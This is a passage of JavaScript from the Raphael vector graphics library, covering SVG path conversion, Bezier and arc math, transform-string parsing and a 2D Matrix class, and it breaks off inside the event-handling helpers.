paths(pathArray);\n            if (pth.abs) {\n                return pathClone(pth.abs);\n            }\n            if (!R.is(pathArray, array) || !R.is(pathArray && pathArray[0], array)) { // rough assumption\n                pathArray = R.parsePathString(pathArray);\n            }\n            if (!pathArray || !pathArray.length) {\n                return [["M", 0, 0]];\n            }\n            var res = [],\n                x = 0,\n                y = 0,\n                mx = 0,\n                my = 0,\n                start = 0;\n            if (pathArray[0][0] == "M") {\n                x = +pathArray[0][1];\n                y = +pathArray[0][2];\n                mx = x;\n                my = y;\n                start++;\n                res[0] = ["M", x, y];\n            }\n            var crz = pathArray.length == 3 && pathArray[0][0] == "M" && pathArray[1][0].toUpperCase() == "R" && pathArray[2][0].toUpperCase() == "Z";\n            for (var r, pa, i = start, ii = pathArray.length; i < ii; i++) {\n                res.push(r = []);\n                pa = pathArray[i];\n                if (pa[0] != upperCase.call(pa[0])) {\n                    r[0] = upperCase.call(pa[0]);\n                    switch (r[0]) {\n                        case "A":\n                            r[1] = pa[1];\n                            r[2] = pa[2];\n                            r[3] = pa[3];\n                            r[4] = pa[4];\n                            r[5] = pa[5];\n                            r[6] = +(pa[6] + x);\n                            r[7] = +(pa[7] + y);\n                            break;\n                        case "V":\n                            r[1] = +pa[1] + y;\n                            break;\n                        case "H":\n                            r[1] = +pa[1] + x;\n                            break;\n                        case "R":\n                            var dots = [x, y][concat](pa.slice(1));\n                            for (var j = 2, jj = dots.length; j < jj; j++) {\n                                dots[j] = +dots[j] + x;\n                                dots[++j] = +dots[j] + y;\n                            }\n                            res.pop();\n                            res = res[concat](catmullRom2bezier(dots, crz));\n                            break;\n                        case "M":\n                            mx = +pa[1] + x;\n                            my = +pa[2] + y;\n                        default:\n                            for (j = 1, jj = pa.length; j < jj; j++) {\n                                r[j] = +pa[j] + ((j % 2) ? x : y);\n                            }\n                    }\n                } else if (pa[0] == "R") {\n                    dots = [x, y][concat](pa.slice(1));\n                    res.pop();\n                    res = res[concat](catmullRom2bezier(dots, crz));\n                    r = ["R"][concat](pa.slice(-2));\n                } else {\n                    for (var k = 0, kk = pa.length; k < kk; k++) {\n                        r[k] = pa[k];\n                    }\n                }\n                switch (r[0]) {\n                    case "Z":\n                        x = mx;\n                        y = my;\n                        break;\n                    case "H":\n                        x = r[1];\n                        break;\n                    case "V":\n                        y = r[1];\n                        break;\n                    case "M":\n                        mx = r[r.length - 2];\n                        my = r[r.length - 1];\n                    default:\n                        x = r[r.length - 2];\n                        y = r[r.length - 1];\n                }\n            }\n            res.toString = R._path2string;\n            pth.abs = pathClone(res);\n            return res;\n        },\n        l2c = function (x1, y1, x2, y2) {\n            return [x1, y1, x2, y2, x2, y2];\n        },\n        q2c = function (x1, y1, ax, ay, x2, y2) {\n            var _13 = 1 / 3,\n                _23 = 2 / 3;\n            return [\n                    _13 * x1 + _23 * ax,\n                    _13 * y1 + _23 * ay,\n                    _13 * x2 + _23 * ax,\n                    _13 * y2 + _23 * ay,\n                    x2,\n                    y2\n                ];\n        },\n        a2c = function (x1, y1, rx, ry, angle, large_arc_flag, sweep_flag, x2, y2, recursive) {\n            // for more information of where this math came from visit:\n            // https://www.w3.org/TR/SVG11/implnote.html#ArcImplementationNotes\n            var _120 = PI * 120 / 180,\n                rad = PI / 180 * (+angle || 0),\n                res = [],\n                xy,\n                rotate = cacher(function (x, y, rad) {\n                    var X = x * math.cos(rad) - y * math.sin(rad),\n                        Y = x * math.sin(rad) + y * math.cos(rad);\n                    return {x: X, y: Y};\n                });\n            if (!recursive) {\n                xy = rotate(x1, y1, -rad);\n                x1 = xy.x;\n                y1 = xy.y;\n                xy = rotate(x2, y2, -rad);\n                x2 = xy.x;\n                y2 = xy.y;\n                var cos = math.cos(PI / 180 * angle),\n                    sin = math.sin(PI / 180 * angle),\n                    x = (x1 - x2) / 2,\n                    y = (y1 - y2) / 2;\n                var h = (x * x) / (rx * rx) + (y * y) / (ry * ry);\n                if (h > 1) {\n                    h = math.sqrt(h);\n                    rx = h * rx;\n                    ry = h * ry;\n                }\n                var rx2 = rx * rx,\n                    ry2 = ry * ry,\n                    k = (large_arc_flag == sweep_flag ? -1 : 1) *\n                        math.sqrt(abs((rx2 * ry2 - rx2 * y * y - ry2 * x * x) / (rx2 * y * y + ry2 * x * x))),\n                    cx = k * rx * y / ry + (x1 + x2) / 2,\n                    cy = k * -ry * x / rx + (y1 + y2) / 2,\n                    f1 = math.asin(((y1 - cy) / ry).toFixed(9)),\n                    f2 = math.asin(((y2 - cy) / ry).toFixed(9));\n\n                f1 = x1 < cx ? PI - f1 : f1;\n                f2 = x2 < cx ? PI - f2 : f2;\n                f1 < 0 && (f1 = PI * 2 + f1);\n                f2 < 0 && (f2 = PI * 2 + f2);\n                if (sweep_flag && f1 > f2) {\n                    f1 = f1 - PI * 2;\n                }\n                if (!sweep_flag && f2 > f1) {\n                    f2 = f2 - PI * 2;\n                }\n            } else {\n                f1 = recursive[0];\n                f2 = recursive[1];\n                cx = recursive[2];\n                cy = recursive[3];\n            }\n            var df = f2 - f1;\n            if (abs(df) > _120) {\n                var f2old = f2,\n                    x2old = x2,\n                    y2old = y2;\n                f2 = f1 + _120 * (sweep_flag && f2 > f1 ? 1 : -1);\n                x2 = cx + rx * math.cos(f2);\n                y2 = cy + ry * math.sin(f2);\n                res = a2c(x2, y2, rx, ry, angle, 0, sweep_flag, x2old, y2old, [f2, f2old, cx, cy]);\n            }\n            df = f2 - f1;\n            var c1 = math.cos(f1),\n                s1 = math.sin(f1),\n                c2 = math.cos(f2),\n                s2 = math.sin(f2),\n                t = math.tan(df / 4),\n                hx = 4 / 3 * rx * t,\n                hy = 4 / 3 * ry * t,\n                m1 = [x1, y1],\n                m2 = [x1 + hx * s1, y1 - hy * c1],\n                m3 = [x2 + hx * s2, y2 - hy * c2],\n                m4 = [x2, y2];\n            m2[0] = 2 * m1[0] - m2[0];\n            m2[1] = 2 * m1[1] - m2[1];\n            if (recursive) {\n                return [m2, m3, m4][concat](res);\n            } else {\n                res = [m2, m3, m4][concat](res).join()[split](",");\n                var newres = [];\n                for (var i = 0, ii = res.length; i < ii; i++) {\n                    newres[i] = i % 2 ? rotate(res[i - 1], res[i], rad).y : rotate(res[i], res[i + 1], rad).x;\n                }\n                return newres;\n            }\n        },\n        findDotAtSegment = function (p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t) {\n            var t1 = 1 - t;\n            return {\n                x: pow(t1, 3) * p1x + pow(t1, 2) * 3 * t * c1x + t1 * 3 * t * t * c2x + pow(t, 3) * p2x,\n                y: pow(t1, 3) * p1y + pow(t1, 2) * 3 * t * c1y + t1 * 3 * t * t * c2y + pow(t, 3) * p2y\n            };\n        },\n        curveDim = cacher(function (p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y) {\n            var a = (c2x - 2 * c1x + p1x) - (p2x - 2 * c2x + c1x),\n                b = 2 * (c1x - p1x) - 2 * (c2x - c1x),\n                c = p1x - c1x,\n                t1 = (-b + math.sqrt(b * b - 4 * a * c)) / 2 / a,\n                t2 = (-b - math.sqrt(b * b - 4 * a * c)) / 2 / a,\n                y = [p1y, p2y],\n                x = [p1x, p2x],\n                dot;\n            abs(t1) > "1e12" && (t1 = .5);\n            abs(t2) > "1e12" && (t2 = .5);\n            if (t1 > 0 && t1 < 1) {\n                dot = findDotAtSegment(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t1);\n                x.push(dot.x);\n                y.push(dot.y);\n            }\n            if (t2 > 0 && t2 < 1) {\n                dot = findDotAtSegment(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t2);\n                x.push(dot.x);\n                y.push(dot.y);\n            }\n            a = (c2y - 2 * c1y + p1y) - (p2y - 2 * c2y + c1y);\n            b = 2 * (c1y - p1y) - 2 * (c2y - c1y);\n            c = p1y - c1y;\n            t1 = (-b + math.sqrt(b * b - 4 * a * c)) / 2 / a;\n            t2 = (-b - math.sqrt(b * b - 4 * a * c)) / 2 / a;\n            abs(t1) > "1e12" && (t1 = .5);\n            abs(t2) > "1e12" && (t2 = .5);\n            if (t1 > 0 && t1 < 1) {\n                dot = findDotAtSegment(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t1);\n                x.push(dot.x);\n                y.push(dot.y);\n            }\n            if (t2 > 0 && t2 < 1) {\n                dot = findDotAtSegment(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, t2);\n                x.push(dot.x);\n                y.push(dot.y);\n            }\n            return {\n                min: {x: mmin[apply](0, x), y: mmin[apply](0, y)},\n                max: {x: mmax[apply](0, x), y: mmax[apply](0, y)}\n            };\n        }),\n        path2curve = R._path2curve = cacher(function (path, path2) {\n            var pth = !path2 && paths(path);\n            if (!path2 && pth.curve) {\n                return pathClone(pth.curve);\n            }\n            var p = pathToAbsolute(path),\n                p2 = path2 && pathToAbsolute(path2),\n                attrs = {x: 0, y: 0, bx: 0, by: 0, X: 0, Y: 0, qx: null, qy: null},\n                attrs2 = {x: 0, y: 0, bx: 0, by: 0, X: 0, Y: 0, qx: null, qy: null},\n                processPath = function (path, d, pcom) {\n                    var nx, ny, tq = {T:1, Q:1};\n                    if (!path) {\n                        return ["C", d.x, d.y, d.x, d.y, d.x, d.y];\n                    }\n                    !(path[0] in tq) && (d.qx = d.qy = null);\n                    switch (path[0]) {\n                        case "M":\n                            d.X = path[1];\n                            d.Y = path[2];\n                            break;\n                        case "A":\n                            path = ["C"][concat](a2c[apply](0, [d.x, d.y][concat](path.slice(1))));\n                            break;\n                        case "S":\n                            if (pcom == "C" || pcom == "S") { // In "S" case we have to take into account, if the previous command is C/S.\n                                nx = d.x * 2 - d.bx;          // And reflect the previous\n                                ny = d.y * 2 - d.by;          // command\'s control point relative to the current point.\n                            }\n                            else {                            // or some else or nothing\n                                nx = d.x;\n                                ny = d.y;\n                            }\n                            path = ["C", nx, ny][concat](path.slice(1));\n                            break;\n                        case "T":\n                            if (pcom == "Q" || pcom == "T") { // In "T" case we have to take into account, if the previous command is Q/T.\n                                d.qx = d.x * 2 - d.qx;        // And make a reflection similar\n                                d.qy = d.y * 2 - d.qy;        // to case "S".\n                            }\n                            else {                            // or something else or nothing\n                                d.qx = d.x;\n                                d.qy = d.y;\n                            }\n                            path = ["C"][concat](q2c(d.x, d.y, d.qx, d.qy, path[1], path[2]));\n                            break;\n                        case "Q":\n                            d.qx = path[1];\n                            d.qy = path[2];\n                            path = ["C"][concat](q2c(d.x, d.y, path[1], path[2], path[3], path[4]));\n                            break;\n                        case "L":\n                            path = ["C"][concat](l2c(d.x, d.y, path[1], path[2]));\n                            break;\n                        case "H":\n                            path = ["C"][concat](l2c(d.x, d.y, path[1], d.y));\n                            break;\n                        case "V":\n                            path = ["C"][concat](l2c(d.x, d.y, d.x, path[1]));\n                            break;\n                        case "Z":\n                            path = ["C"][concat](l2c(d.x, d.y, d.X, d.Y));\n                            break;\n                    }\n                    return path;\n                },\n                fixArc = function (pp, i) {\n                    if (pp[i].length > 7) {\n                        pp[i].shift();\n                        var pi = pp[i];\n                        while (pi.length) {\n                            pcoms1[i]="A"; // if created multiple C:s, their original seg is saved\n                            p2 && (pcoms2[i]="A"); // the same as above\n                            pp.splice(i++, 0, ["C"][concat](pi.splice(0, 6)));\n                        }\n                        pp.splice(i, 1);\n                        ii = mmax(p.length, p2 && p2.length || 0);\n                    }\n                },\n                fixM = function (path1, path2, a1, a2, i) {\n                    if (path1 && path2 && path1[i][0] == "M" && path2[i][0] != "M") {\n                        path2.splice(i, 0, ["M", a2.x, a2.y]);\n                        a1.bx = 0;\n                        a1.by = 0;\n                        a1.x = path1[i][1];\n                        a1.y = path1[i][2];\n                        ii = mmax(p.length, p2 && p2.length || 0);\n                    }\n                },\n                pcoms1 = [], // path commands of original path p\n                pcoms2 = [], // path commands of original path p2\n                pfirst = "", // temporary holder for original path command\n                pcom = ""; // holder for previous path command of original path\n            for (var i = 0, ii = mmax(p.length, p2 && p2.length || 0); i < ii; i++) {\n                p[i] && (pfirst = p[i][0]); // save current path command\n\n                if (pfirst != "C") // C is not saved yet, because it may be result of conversion\n                {\n                    pcoms1[i] = pfirst; // Save current path command\n                    i && ( pcom = pcoms1[i-1]); // Get previous path command pcom\n                }\n                p[i] = processPath(p[i], attrs, pcom); // Previous path command is inputted to processPath\n\n                if (pcoms1[i] != "A" && pfirst == "C") pcoms1[i] = "C"; // A is the only command\n                // which may produce multiple C:s\n                // so we have to make sure that C is also C in original path\n\n                fixArc(p, i); // fixArc adds also the right amount of A:s to pcoms1\n\n                if (p2) { // the same procedures is done to p2\n                    p2[i] && (pfirst = p2[i][0]);\n                    if (pfirst != "C")\n                    {\n                        pcoms2[i] = pfirst;\n                        i && (pcom = pcoms2[i-1]);\n                    }\n                    p2[i] = processPath(p2[i], attrs2, pcom);\n\n                    if (pcoms2[i]!="A" && pfirst=="C") pcoms2[i]="C";\n\n                    fixArc(p2, i);\n                }\n                fixM(p, p2, attrs, attrs2, i);\n                fixM(p2, p, attrs2, attrs, i);\n                var seg = p[i],\n                    seg2 = p2 && p2[i],\n                    seglen = seg.length,\n                    seg2len = p2 && seg2.length;\n                attrs.x = seg[seglen - 2];\n                attrs.y = seg[seglen - 1];\n                attrs.bx = toFloat(seg[seglen - 4]) || attrs.x;\n                attrs.by = toFloat(seg[seglen - 3]) || attrs.y;\n                attrs2.bx = p2 && (toFloat(seg2[seg2len - 4]) || attrs2.x);\n                attrs2.by = p2 && (toFloat(seg2[seg2len - 3]) || attrs2.y);\n                attrs2.x = p2 && seg2[seg2len - 2];\n                attrs2.y = p2 && seg2[seg2len - 1];\n            }\n            if (!p2) {\n                pth.curve = pathClone(p);\n            }\n            return p2 ? [p, p2] : p;\n        }, null, pathClone),\n        parseDots = R._parseDots = cacher(function (gradient) {\n            var dots = [];\n            for (var i = 0, ii = gradient.length; i < ii; i++) {\n                var dot = {},\n                    par = gradient[i].match(/^([^:]*):?([\\d\\.]*)/);\n                dot.color = R.getRGB(par[1]);\n                if (dot.color.error) {\n                    return null;\n                }\n                dot.opacity = dot.color.opacity;\n                dot.color = dot.color.hex;\n                par[2] && (dot.offset = par[2] + "%");\n                dots.push(dot);\n            }\n            for (i = 1, ii = dots.length - 1; i < ii; i++) {\n                if (!dots[i].offset) {\n                    var start = toFloat(dots[i - 1].offset || 0),\n                        end = 0;\n                    for (var j = i + 1; j < ii; j++) {\n                        if (dots[j].offset) {\n                            end = dots[j].offset;\n                            break;\n                        }\n                    }\n                    if (!end) {\n                        end = 100;\n                        j = ii;\n                    }\n                    end = toFloat(end);\n                    var d = (end - start) / (j - i + 1);\n                    for (; i < j; i++) {\n                        start += d;\n                        dots[i].offset = start + "%";\n                    }\n                }\n            }\n            return dots;\n        }),\n        tear = R._tear = function (el, paper) {\n            el == paper.top && (paper.top = el.prev);\n            el == paper.bottom && (paper.bottom = el.next);\n            el.next && (el.next.prev = el.prev);\n            el.prev && (el.prev.next = el.next);\n        },\n        tofront = R._tofront = function (el, paper) {\n            if (paper.top === el) {\n                return;\n            }\n            tear(el, paper);\n            el.next = null;\n            el.prev = paper.top;\n            paper.top.next = el;\n            paper.top = el;\n        },\n        toback = R._toback = function (el, paper) {\n            if (paper.bottom === el) {\n                return;\n            }\n            tear(el, paper);\n            el.next = paper.bottom;\n            el.prev = null;\n            paper.bottom.prev = el;\n            paper.bottom = el;\n        },\n        insertafter = R._insertafter = function (el, el2, paper) {\n            tear(el, paper);\n            el2 == paper.top && (paper.top = el);\n            el2.next && (el2.next.prev = el);\n            el.next = el2.next;\n            el.prev = el2;\n            el2.next = el;\n        },\n        insertbefore = R._insertbefore = function (el, el2, paper) {\n            tear(el, paper);\n            el2 == paper.bottom && (paper.bottom = el);\n            el2.prev && (el2.prev.next = el);\n            el.prev = el2.prev;\n            el2.prev = el;\n            el.next = el2;\n        },\n        /*\\\n         * Raphael.toMatrix\n         [ method ]\n         **\n         * Utility method\n         **\n         * Returns matrix of transformations applied to a given path\n         > Parameters\n         - path (string) path string\n         - transform (string|array) transformation string\n         = (object) @Matrix\n        \\*/\n        toMatrix = R.toMatrix = function (path, transform) {\n            var bb = pathDimensions(path),\n                el = {\n                    _: {\n                        transform: E\n                    },\n                    getBBox: function () {\n                        return bb;\n                    }\n                };\n            extractTransform(el, transform);\n            return el.matrix;\n        },\n        /*\\\n         * Raphael.transformPath\n         [ method ]\n         **\n         * Utility method\n         **\n         * Returns path transformed by a given transformation\n         > Parameters\n         - path (string) path string\n         - transform (string|array) transformation string\n         = (string) path\n        \\*/\n        transformPath = R.transformPath = function (path, transform) {\n            return mapPath(path, toMatrix(path, transform));\n        },\n        extractTransform = R._extractTransform = function (el, tstr) {\n            if (tstr == null) {\n                return el._.transform;\n            }\n            tstr = Str(tstr).replace(/\\.{3}|\\u2026/g, el._.transform || E);\n            var tdata = R.parseTransformString(tstr),\n                deg = 0,\n                dx = 0,\n                dy = 0,\n                sx = 1,\n                sy = 1,\n                _ = el._,\n                m = new Matrix;\n            _.transform = tdata || [];\n            if (tdata) {\n                for (var i = 0, ii = tdata.length; i < ii; i++) {\n                    var t = tdata[i],\n                        tlen = t.length,\n                        command = Str(t[0]).toLowerCase(),\n                        absolute = t[0] != command,\n                        inver = absolute ? m.invert() : 0,\n                        x1,\n                        y1,\n                        x2,\n                        y2,\n                        bb;\n                    if (command == "t" && tlen == 3) {\n                        if (absolute) {\n                            x1 = inver.x(0, 0);\n                            y1 = inver.y(0, 0);\n                            x2 = inver.x(t[1], t[2]);\n                            y2 = inver.y(t[1], t[2]);\n                            m.translate(x2 - x1, y2 - y1);\n                        } else {\n                            m.translate(t[1], t[2]);\n                        }\n                    } else if (command == "r") {\n                        if (tlen == 2) {\n                            bb = bb || el.getBBox(1);\n                            m.rotate(t[1], bb.x + bb.width / 2, bb.y + bb.height / 2);\n                            deg += t[1];\n                        } else if (tlen == 4) {\n                            if (absolute) {\n                                x2 = inver.x(t[2], t[3]);\n                                y2 = inver.y(t[2], t[3]);\n                                m.rotate(t[1], x2, y2);\n                            } else {\n                                m.rotate(t[1], t[2], t[3]);\n                            }\n                            deg += t[1];\n                        }\n                    } else if (command == "s") {\n                        if (tlen == 2 || tlen == 3) {\n                            bb = bb || el.getBBox(1);\n                            m.scale(t[1], t[tlen - 1], bb.x + bb.width / 2, bb.y + bb.height / 2);\n                            sx *= t[1];\n                            sy *= t[tlen - 1];\n                        } else if (tlen == 5) {\n                            if (absolute) {\n                                x2 = inver.x(t[3], t[4]);\n                                y2 = inver.y(t[3], t[4]);\n                                m.scale(t[1], t[2], x2, y2);\n                            } else {\n                                m.scale(t[1], t[2], t[3], t[4]);\n                            }\n                            sx *= t[1];\n                            sy *= t[2];\n                        }\n                    } else if (command == "m" && tlen == 7) {\n                        m.add(t[1], t[2], t[3], t[4], t[5], t[6]);\n                    }\n                    _.dirtyT = 1;\n                    el.matrix = m;\n                }\n            }\n\n            /*\\\n             * Element.matrix\n             [ property (object) ]\n             **\n             * Keeps @Matrix object, which represents element transformation\n            \\*/\n            el.matrix = m;\n\n            _.sx = sx;\n            _.sy = sy;\n            _.deg = deg;\n            _.dx = dx = m.e;\n            _.dy = dy = m.f;\n\n            if (sx == 1 && sy == 1 && !deg && _.bbox) {\n                _.bbox.x += +dx;\n                _.bbox.y += +dy;\n            } else {\n                _.dirtyT = 1;\n            }\n        },\n        getEmpty = function (item) {\n            var l = item[0];\n            switch (l.toLowerCase()) {\n                case "t": return [l, 0, 0];\n                case "m": return [l, 1, 0, 0, 1, 0, 0];\n                case "r": if (item.length == 4) {\n                    return [l, 0, item[2], item[3]];\n                } else {\n                    return [l, 0];\n                }\n                case "s": if (item.length == 5) {\n                    return [l, 1, 1, item[3], item[4]];\n                } else if (item.length == 3) {\n                    return [l, 1, 1];\n                } else {\n                    return [l, 1];\n                }\n            }\n        },\n        equaliseTransform = R._equaliseTransform = function (t1, t2) {\n            t2 = Str(t2).replace(/\\.{3}|\\u2026/g, t1);\n            t1 = R.parseTransformString(t1) || [];\n            t2 = R.parseTransformString(t2) || [];\n            var maxlength = mmax(t1.length, t2.length),\n                from = [],\n                to = [],\n                i = 0, j, jj,\n                tt1, tt2;\n            for (; i < maxlength; i++) {\n                tt1 = t1[i] || getEmpty(t2[i]);\n                tt2 = t2[i] || getEmpty(tt1);\n                if ((tt1[0] != tt2[0]) ||\n                    (tt1[0].toLowerCase() == "r" && (tt1[2] != tt2[2] || tt1[3] != tt2[3])) ||\n                    (tt1[0].toLowerCase() == "s" && (tt1[3] != tt2[3] || tt1[4] != tt2[4]))\n                    ) {\n                    return;\n                }\n                from[i] = [];\n                to[i] = [];\n                for (j = 0, jj = mmax(tt1.length, tt2.length); j < jj; j++) {\n                    j in tt1 && (from[i][j] = tt1[j]);\n                    j in tt2 && (to[i][j] = tt2[j]);\n                }\n            }\n            return {\n                from: from,\n                to: to\n            };\n        };\n    R._getContainer = function (x, y, w, h) {\n        var container;\n        container = h == null && !R.is(x, "object") ? g.doc.getElementById(x) : x;\n        if (container == null) {\n            return;\n        }\n        if (container.tagName) {\n            if (y == null) {\n                return {\n                    container: container,\n                    width: container.style.pixelWidth || container.offsetWidth,\n                    height: container.style.pixelHeight || container.offsetHeight\n                };\n            } else {\n                return {\n                    container: container,\n                    width: y,\n                    height: w\n                };\n            }\n        }\n        return {\n            container: 1,\n            x: x,\n            y: y,\n            width: w,\n            height: h\n        };\n    };\n    /*\\\n     * Raphael.pathToRelative\n     [ method ]\n     **\n     * Utility method\n     **\n     * Converts path to relative form\n     > Parameters\n     - pathString (string|array) path string or array of segments\n     = (array) array of segments.\n    \\*/\n    R.pathToRelative = pathToRelative;\n    R._engine = {};\n    /*\\\n     * Raphael.path2curve\n     [ method ]\n     **\n     * Utility method\n     **\n     * Converts path to a new path where all segments are cubic bezier curves.\n     > Parameters\n     - pathString (string|array) path string or array of segments\n     = (array) array of segments.\n    \\*/\n    R.path2curve = path2curve;\n    /*\\\n     * Raphael.matrix\n     [ method ]\n     **\n     * Utility method\n     **\n     * Returns matrix based on given parameters.\n     > Parameters\n     - a (number)\n     - b (number)\n     - c (number)\n     - d (number)\n     - e (number)\n     - f (number)\n     = (object) @Matrix\n    \\*/\n    R.matrix = function (a, b, c, d, e, f) {\n        return new Matrix(a, b, c, d, e, f);\n    };\n    function Matrix(a, b, c, d, e, f) {\n        if (a != null) {\n            this.a = +a;\n            this.b = +b;\n            this.c = +c;\n            this.d = +d;\n            this.e = +e;\n            this.f = +f;\n        } else {\n            this.a = 1;\n            this.b = 0;\n            this.c = 0;\n            this.d = 1;\n            this.e = 0;\n            this.f = 0;\n        }\n    }\n    (function (matrixproto) {\n        /*\\\n         * Matrix.add\n         [ method ]\n         **\n         * Adds given matrix to existing one.\n         > Parameters\n         - a (number)\n         - b (number)\n         - c (number)\n         - d (number)\n         - e (number)\n         - f (number)\n         or\n         - matrix (object) @Matrix\n        \\*/\n        matrixproto.add = function (a, b, c, d, e, f) {\n            var out = [[], [], []],\n                m = [[this.a, this.c, this.e], [this.b, this.d, this.f], [0, 0, 1]],\n                matrix = [[a, c, e], [b, d, f], [0, 0, 1]],\n                x, y, z, res;\n\n            if (a && a instanceof Matrix) {\n                matrix = [[a.a, a.c, a.e], [a.b, a.d, a.f], [0, 0, 1]];\n            }\n\n            for (x = 0; x < 3; x++) {\n                for (y = 0; y < 3; y++) {\n                    res = 0;\n                    for (z = 0; z < 3; z++) {\n                        res += m[x][z] * matrix[z][y];\n                    }\n                    out[x][y] = res;\n                }\n            }\n            this.a = out[0][0];\n            this.b = out[1][0];\n            this.c = out[0][1];\n            this.d = out[1][1];\n            this.e = out[0][2];\n            this.f = out[1][2];\n        };\n        /*\\\n         * Matrix.invert\n         [ method ]\n         **\n         * Returns inverted version of the matrix\n         = (object) @Matrix\n        \\*/\n        matrixproto.invert = function () {\n            var me = this,\n                x = me.a * me.d - me.b * me.c;\n            return new Matrix(me.d / x, -me.b / x, -me.c / x, me.a / x, (me.c * me.f - me.d * me.e) / x, (me.b * me.e - me.a * me.f) / x);\n        };\n        /*\\\n         * Matrix.clone\n         [ method ]\n         **\n         * Returns copy of the matrix\n         = (object) @Matrix\n        \\*/\n        matrixproto.clone = function () {\n            return new Matrix(this.a, this.b, this.c, this.d, this.e, this.f);\n        };\n        /*\\\n         * Matrix.translate\n         [ method ]\n         **\n         * Translate the matrix\n         > Parameters\n         - x (number)\n         - y (number)\n        \\*/\n        matrixproto.translate = function (x, y) {\n            this.add(1, 0, 0, 1, x, y);\n        };\n        /*\\\n         * Matrix.scale\n         [ method ]\n         **\n         * Scales the matrix\n         > Parameters\n         - x (number)\n         - y (number) #optional\n         - cx (number) #optional\n         - cy (number) #optional\n        \\*/\n        matrixproto.scale = function (x, y, cx, cy) {\n            y == null && (y = x);\n            (cx || cy) && this.add(1, 0, 0, 1, cx, cy);\n            this.add(x, 0, 0, y, 0, 0);\n            (cx || cy) && this.add(1, 0, 0, 1, -cx, -cy);\n        };\n        /*\\\n         * Matrix.rotate\n         [ method ]\n         **\n         * Rotates the matrix\n         > Parameters\n         - a (number)\n         - x (number)\n         - y (number)\n        \\*/\n        matrixproto.rotate = function (a, x, y) {\n            a = R.rad(a);\n            x = x || 0;\n            y = y || 0;\n            var cos = +math.cos(a).toFixed(9),\n                sin = +math.sin(a).toFixed(9);\n            this.add(cos, sin, -sin, cos, x, y);\n            this.add(1, 0, 0, 1, -x, -y);\n        };\n        /*\\\n         * Matrix.x\n         [ method ]\n         **\n         * Return x coordinate for given point after transformation described by the matrix. See also @Matrix.y\n         > Parameters\n         - x (number)\n         - y (number)\n         = (number) x\n        \\*/\n        matrixproto.x = function (x, y) {\n            return x * this.a + y * this.c + this.e;\n        };\n        /*\\\n         * Matrix.y\n         [ method ]\n         **\n         * Return y coordinate for given point after transformation described by the matrix. See also @Matrix.x\n         > Parameters\n         - x (number)\n         - y (number)\n         = (number) y\n        \\*/\n        matrixproto.y = function (x, y) {\n            return x * this.b + y * this.d + this.f;\n        };\n        matrixproto.get = function (i) {\n            return +this[Str.fromCharCode(97 + i)].toFixed(4);\n        };\n        matrixproto.toString = function () {\n            return R.svg ?\n                "matrix(" + [this.get(0), this.get(1), this.get(2), this.get(3), this.get(4), this.get(5)].join() + ")" :\n                [this.get(0), this.get(2), this.get(1), this.get(3), 0, 0].join();\n        };\n        matrixproto.toFilter = function () {\n            return "progid:DXImageTransform.Microsoft.Matrix(M11=" + this.get(0) +\n                ", M12=" + this.get(2) + ", M21=" + this.get(1) + ", M22=" + this.get(3) +\n                ", Dx=" + this.get(4) + ", Dy=" + this.get(5) + ", sizingmethod=\'auto expand\')";\n        };\n        matrixproto.offset = function () {\n            return [this.e.toFixed(4), this.f.toFixed(4)];\n        };\n        function norm(a) {\n            return a[0] * a[0] + a[1] * a[1];\n        }\n        function normalize(a) {\n            var mag = math.sqrt(norm(a));\n            a[0] && (a[0] /= mag);\n            a[1] && (a[1] /= mag);\n        }\n        /*\\\n         * Matrix.split\n         [ method ]\n         **\n         * Splits matrix into primitive transformations\n         = (object) in format:\n         o dx (number) translation by x\n         o dy (number) translation by y\n         o scalex (number) scale by x\n         o scaley (number) scale by y\n         o shear (number) shear\n         o rotate (number) rotation in deg\n         o isSimple (boolean) could it be represented via simple transformations\n        \\*/\n        matrixproto.split = function () {\n            var out = {};\n            // translation\n            out.dx = this.e;\n            out.dy = this.f;\n\n            // scale and shear\n            var row = [[this.a, this.c], [this.b, this.d]];\n            out.scalex = math.sqrt(norm(row[0]));\n            normalize(row[0]);\n\n            out.shear = row[0][0] * row[1][0] + row[0][1] * row[1][1];\n            row[1] = [row[1][0] - row[0][0] * out.shear, row[1][1] - row[0][1] * out.shear];\n\n            out.scaley = math.sqrt(norm(row[1]));\n            normalize(row[1]);\n            out.shear /= out.scaley;\n\n            // rotation\n            var sin = -row[0][1],\n                cos = row[1][1];\n            if (cos < 0) {\n                out.rotate = R.deg(math.acos(cos));\n                if (sin < 0) {\n                    out.rotate = 360 - out.rotate;\n                }\n            } else {\n                out.rotate = R.deg(math.asin(sin));\n            }\n\n            out.isSimple = !+out.shear.toFixed(9) && (out.scalex.toFixed(9) == out.scaley.toFixed(9) || !out.rotate);\n            out.isSuperSimple = !+out.shear.toFixed(9) && out.scalex.toFixed(9) == out.scaley.toFixed(9) && !out.rotate;\n            out.noRotation = !+out.shear.toFixed(9) && !out.rotate;\n            return out;\n        };\n        /*\\\n         * Matrix.toTransformString\n         [ method ]\n         **\n         * Return transform string that represents given matrix\n         = (string) transform string\n        \\*/\n        matrixproto.toTransformString = function (shorter) {\n            var s = shorter || this[split]();\n            if (s.isSimple) {\n                s.scalex = +s.scalex.toFixed(4);\n                s.scaley = +s.scaley.toFixed(4);\n                s.rotate = +s.rotate.toFixed(4);\n                return  (s.dx || s.dy ? "t" + [s.dx, s.dy] : E) +\n                        (s.scalex != 1 || s.scaley != 1 ? "s" + [s.scalex, s.scaley, 0, 0] : E) +\n                        (s.rotate ? "r" + [s.rotate, 0, 0] : E);\n            } else {\n                return "m" + [this.get(0), this.get(1), this.get(2), this.get(3), this.get(4), this.get(5)];\n            }\n        };\n    })(Matrix.prototype);\n\n    var preventDefault = function () {\n        this.returnValue = false;\n    },\n    preventTouch = function () {\n        return this.originalEvent.preventDefault();\n    },\n    stopPropagation = function () {\n        this.cancelBubble = true;\n    },\n    stopTouch = function () {\n        return this.originalEvent.stopPropagation();\n    },\n    getEventPosition = function (e) {\n        var scrollY = g.doc.documentElement.scrollTop || g.doc.body.scrollTop,\n            scrollX = g.doc.documentElement.scrollLeft || g.doc.body.scrollLeft;\n\n        return {\n            x: e.clientX + scrollX,\n            y: e.clientY + scrollY\n        };\n    },\n    addEvent = (function () {\n        if (g.doc.addEventListener) {\n            return function (obj, 